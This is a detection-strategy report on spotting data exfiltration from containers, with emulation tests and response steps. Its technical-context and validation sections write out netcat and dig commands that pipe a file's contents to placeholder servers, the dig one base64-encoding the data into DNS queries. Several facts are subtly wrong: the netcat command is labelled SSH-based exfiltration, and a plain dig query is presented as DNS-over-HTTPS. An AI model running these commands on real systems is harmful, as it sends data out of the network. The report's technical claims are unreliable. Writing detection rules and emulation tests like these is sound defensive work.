# Alerting & Detection Strategy (ADS) Report: Detect Adversarial Attempts to Bypass Security Monitoring Using Containers

## Goal
This technique aims to detect adversarial attempts to bypass security monitoring by exploiting containers as alternative communication channels for data exfiltration.

## Strategy Abstract
The detection strategy leverages data from network traffic logs and container orchestration monitoring tools (e.g., Kubernetes audit logs) to identify unusual activity indicative of alternative protocol exfiltration through containers. Key patterns analyzed include unexpected outbound connections initiated by containers, anomalous DNS requests generated within container environments, and irregular container lifecycle events.

## Technical Context
Adversaries may use containers as a means to bypass traditional network security monitoring tools due to their ephemeral nature and the encapsulation they provide. Common methods involve:
- **SSH-based Exfiltration:** Utilizing SSH services running inside containers to transfer data outside of the enterprise boundary.
- **DNSExfiltration:** Encoding exfiltrated data in DNS queries, particularly over HTTPS (DoH), which can evade traditional network filters.

Adversaries might initiate these actions using commands like:
```bash
# SSH-based Exfiltration
docker exec <container_id> nc -w 3 target_server_ip 1234 < /path/to/exfiltrate

# DNSExfiltration with dig
docker exec <container_id> dig @<dns_exfiltration_server> $(cat exfiltrated_data.txt | base64) TXT +short
```

## Blind Spots and Assumptions
- **Blind Spots:** Detection might miss sophisticated adversaries that use encrypted or obfuscated payloads, making them difficult to distinguish from normal traffic.
- **Assumptions:** This strategy assumes containers are deployed in environments where network traffic can be adequately monitored and analyzed. It also assumes that baseline behavior for container activity is well understood.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate use of SSH within containers for development or administrative tasks.
- Use of DNS-based services like DoH by legitimate applications for privacy reasons.

## Priority
**Priority:** High  
Justification: The potential impact of undetected data exfiltration is significant, as it can lead to the loss of sensitive information and intellectual property. Containers' ability to quickly scale and change state makes timely detection critical.

## Validation (Adversary Emulation)
### Exfiltration Over Alternative Protocol - SSH
1. Deploy a test container with an SSH service.
2. Execute an exfiltration command:  
   ```bash
   docker exec <container_id> nc -w 3 target_server_ip 1234 < /path/to/exfiltrate
   ```
3. Monitor network traffic for unexpected outbound connections from the container.

### Exfiltration Over Alternative Protocol - SSH (Repeat)
1. Ensure redundancy in detection by performing multiple iterations of the above test.
2. Validate consistency and reliability of alert triggers across different container instances.

### DNSExfiltration (doh)
1. Configure a DoH-capable DNS server within a container environment.
2. Execute a command to perform exfiltration via DNS queries:
   ```bash
   docker exec <container_id> dig @<dns_exfiltration_server> $(cat exfiltrated_data.txt | base64) TXT +short
   ```
3. Analyze network logs for unusual DNS query patterns.

### Exfiltrate Data using DNS Queries via dig
1. Use the `dig` command to simulate data encoding in DNS queries.
2. Validate detection mechanisms by monitoring DNS traffic and identifying anomalous requests.

## Response
When an alert triggers:
- Immediately isolate affected containers to prevent further potential exfiltration.
- Conduct a thorough investigation into network logs and container activity for signs of compromise or unauthorized access.
- Review and update security policies regarding the use of containers, focusing on enforcing strict network monitoring and controls over inter-container communication.
